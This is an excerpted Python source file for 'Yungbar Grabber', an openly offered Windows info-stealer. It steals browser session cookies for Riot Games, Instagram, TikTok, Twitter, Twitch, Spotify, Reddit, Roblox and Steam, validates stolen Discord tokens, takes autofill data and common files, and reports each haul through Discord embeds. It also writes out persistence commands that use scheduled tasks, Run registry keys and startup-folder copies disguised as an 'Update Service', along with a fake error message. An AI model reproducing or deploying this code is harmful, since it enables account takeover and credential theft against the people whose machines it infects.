# Yungbar Grabber All Rights Recieved
# Coded by kero.inc
# https://discord.gg/bH3CvNnqsg
...
class Main:
    ...
    async def RiotGamesSession(self, cookie, browser:str) -> None:
        try:
            ...
            async with aiohttp.ClientSession(connector=connector) as session:
                ...
                embed_data = {
                    "title": "***Yungbar Grabber***",
                    "description": f"***Yungbar Riot Games Session was detected on the {browser} browser***",
    ...
    async def InstaSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***Yungbar Grabber***",
                "description": f"***Yungbar Instagram Session was detected on the {browser} browser***",
                "url" : "https://discord.gg/bH3CvNnqsg",
                "color": 0,
    ...
    async def TikTokSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***Yungbar Grabber***",
                "description": f"***Yungbar Tiktok Session was detected on the {browser} browser***",
                "url" : "https://discord.gg/bH3CvNnqsg",
                "color": 0,
                "footer": {"text": "https://discord.gg/bH3CvNnqsg | https://github.com/GanGbaY"},
    ...
    async def TwitterSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***Yungbar Grabber***",
                "description": f"***Yungbar Twitter Session was detected on the {browser} browser***",
                "url" : "https://discord.gg/bH3CvNnqsg",
                "color": 0,
                "footer": {"text": "https://discord.gg/bH3CvNnqsg | https://github.com/GanGbaY"},
                "thumbnail": {"url": pp}}
    ...
    async def TwitchSession(self, auth_token, username, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***Yungbar Grabber***",
                "description": f"***Yungbar Twitch Session was detected on the {browser} browser***",
                "url" : "https://discord.gg/bH3CvNnqsg",
                "color": 0,
                "footer": {"text": "https://discord.gg/bH3CvNnqsg | https://github.com/GanGbaY"},
                "thumbnail": {"url": pp}}
    ...
    async def SpotifySession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***Yungbar Grabber***",
                "description": f"***Yungbar Spotify Session was detected on the {browser} browser***",
                "url" : "https://discord.gg/bH3CvNnqsg",
                "color": 0,
                "footer": {"text": "https://discord.gg/bH3CvNnqsg | https://github.com/GanGbaY"},
                "thumbnail": {"url": "https://cdn.discordapp..png"}}
    ...
    async def RedditSession(self, cookie, browser:str) -> None:
        try:
            ...
            embed_data = {
                "title": "***Yungbar Grabber***",
                "description": f"***Yungbar Reddit Session was detected on the {browser} browser***",
                "url" : "https://discord.gg/bH3CvNnqsg",
                "color": 0,
                "footer": {"text": "https://discord.gg/bH3CvNnqsg | https://github.com/GanGbaY"},
                "thumbnail": {"url": pp}}
    ...
    async def RobloxSession(self, cookie, browser:str) -> None:
        try:
            ...
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                ...
                embed_data = {
                    "title": "***Yungbar Grabber***",
                    "description": f"***Yungbar Roblox Session was detected on the {browser} browser***",
                    "url" : "https://discord.gg/bH3CvNnqsg",
                    "color": 0,
                    "footer": {"text": "https://discord.gg/bH3CvNnqsg
                            | https://github.com/GanGbaY"},
                    "thumbnail": {"url": pp}}
                fields = [
    ...
    async def ValidateTokenAndGetInfo(self, token:str) -> None:
        try:
            ...
            if data:
                embed_data = {
                "title": "***Yungbar Grabber***",
                "description": f"***Yungbar Validated Discord Token Detected***",
                "url" : "https://discord.gg/bH3CvNnqsg
                       ",
                "color": 0,
                "footer": {"text": "https://discord.gg/bH3CvNnqsg | https://github.com/GanGbaY"},
                    ...
                    with open(steam_paths, "r", encoding="utf-8", errors="ignore") as file:
                        ...
                        if steamid:
                            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                                ...
                                embed_data = {
                                    "title": "***Yungbar Grabber***",
                                    "description": f"***Yungbar Steam Session Detected***",
        ...
        try:
            ...
            if self.FirefoxAutofiList:
                with open(os.path.join(filePath, "Browsers", "Firefox", "Autofills.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    file.write("----------------------https://t.mew/Yungbar----------------------\n"+ "=" * 70 + "\n")
    ...
    async def SendAllData(self) -> None:
        ...
        embed_data = {
            "title": "***Yungbar Grabber***",
            "description": f"***Yungbar Grabber Full Info***",
            "url" : "https://discord.gg/bH3CvNnqsg",
            "color": 0,
            "footer": {"text": "https://discord.gg/bH3CvNnqsg | https://github.com/GanGbaY"},
            "thumbnail": {"url": "https://cdn.discordapp..png"}}
...
class StealCommonFiles:
    ...
    async def StealFiles(self) -> None:
        try:
            ...
            destination_directory = os.path.join(self.temp, "StealedFilesByYungbar")
...
class Startup:
    def __init__(self) -> None:
        ...
        self.ToPath:str = os.path.join(self.LocalAppData, "YungbarUpdateService", "Yungbar.exe")
    ...
    async def CreatePathAndMelt(self) -> None:
        try:
            if os.path.exists(self.ToPath): # if the startup file already exist, return
                ...
                os.mkdir(self.ToPath.replace("Yungbar.exe", "")) # Create Directory
    ...
    async def SchtaskStartup(self) -> None: # schtask method for startup
        try:
            command = await asyncio.create_subprocess_shell(
                'schtasks /query /TN "YungbarUpdateService"',
                shell=True,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE)
            ...
            if not stdout: # if the file not on schtasks
                if self.Privalage: # if the code running on admin privilage, execute the startup command
                    try:
                        onLogonCommand = f'schtasks /create /f /sc onlogon /rl highest /tn "YungbarUpdateService" /tr "{self.ToPath}"'
                        everyOneHour = f'schtasks /create /f /sc hourly /mo 1 /rl highest /tn "YungbarUpdateService2" /tr "{self.ToPath}"'
                    ...
                    if result > 32: # if the user give the admin req close the normal code for execute the admin priv code
                        ...
                        try:
                            command = f'schtasks /create /f /sc daily /ri 30 /tn "YungbarUpdateService" /tr "{self.ToPath}"'
                            ...
                            process = await asyncio.create_subprocess_shell(
                            f'schtasks /create /f /tn "YungbarUpdateService" /tr "{self.ToPath}" /sc daily /ri 30',
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.PIPE,
                            shell=True)
                            await process.communicate()
    ...
    async def RegeditStartup(self) -> None: # regedit method for startup
        try:
            if not self.Privalage: # if the code not running admin privilage, copy to HKCU
                process = await asyncio.create_subprocess_shell(
                f'reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Yungbar Update Service" /t REG_SZ /d "{self.ToPath}" /f',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True)
                await process.communicate()
                ...
                process = await asyncio.create_subprocess_shell(
                f'reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Yungbar Update Service" /t REG_SZ /d "{self.ToPath}" /f',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True)
                await process.communicate()
    ...
    async def FolderStartup(self): # folder method for startup
        try:
            if self.Privalage: #if the code running admin privilage, copy to common startup path
                if os.path.isfile(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Yungbar.exe"):
                    print("[+] File already on startup!")
                else:
                    shutil.copy(self.CurrentFile, r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Yungbar.exe")
            else: #if the code not running admin privilage, copy to normal startup path
                if os.path.isfile(os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "Yungbar.exe")):
                    print("[+] File already on startup!")
                else:
                    shutil.copy(self.CurrentFile, os.path.join(self.RoamingAppData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "Yungbar.exe"))
        except Exception as e:
            print(str(e))
...
async def Fakerror() -> None:
    try:
        if FakeError[0] and not os.path.abspath(sys.argv[0]) == os.path.join(os.getenv("LOCALAPPDATA"), "YungbarUpdateService", "Yungbar.exe"):
...
if __name__ == '__main__':
    if os.name == "nt":
        if not SubModules.create_mutex("Yungbar | Grabber | on top |"):
        ...
        print("just Windows Operating system's supported by Yungbar")
